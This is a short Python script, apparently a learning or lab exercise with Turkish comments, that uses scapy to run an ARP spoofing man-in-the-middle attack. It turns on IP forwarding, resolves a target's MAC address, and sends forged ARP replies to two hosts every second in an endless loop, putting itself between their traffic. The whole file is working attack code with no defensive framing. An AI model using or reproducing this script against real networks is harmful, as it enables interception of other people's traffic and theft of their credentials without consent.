import os
import scapy.all as scapy
import time
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
def MacBulucu(ip):
    res_packet = scapy.ARP(pdst=ip)
    view_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    fake_packet = view_packet / res_packet
    #Sürekli paket gönderme bilgisini vermemesi adına Verbose'yi false yaptık.
    packet = scapy.srp(fake_packet, timeout=2, verbose=False)[0]

    if len(packet) == 0:
        print("MAC bulunamadı")
    else:
        return (packet[0][1].hwsrc)

def ArpPaket(ip1,ip2):
    macadresi = MacBulucu(ip1)
    arp_paketi = scapy.ARP(op=2, pdst=ip1,hwdst=macadresi, psrc=ip2)
    #Sürekli paket gönderme bilgisini vermemesi adına Verbose'yi false yaptık.
    scapy.send(arp_paketi, verbose=False)


while True:
    ArpPaket("192.168.1.100","10.0.2.15")
    ArpPaket("10.0.2.15","192.168.1.100")
    time.sleep(1)

